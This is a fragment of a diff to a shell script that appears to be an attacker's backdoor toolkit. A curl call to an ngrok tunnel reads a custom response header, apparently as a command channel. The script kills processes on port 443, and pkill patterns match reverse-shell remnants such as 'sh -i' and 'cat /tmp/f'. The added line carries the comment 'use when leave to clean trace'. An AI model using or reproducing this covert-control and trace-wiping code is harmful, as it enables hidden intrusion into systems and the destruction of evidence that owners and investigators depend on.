@@ -2,7 +2,7 @@ curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:
 
 #kill
 kill -9 $(lsof -t -i :443)
-pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl"
+pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace
 #cron job
 
 # Looks cryptic at a glance
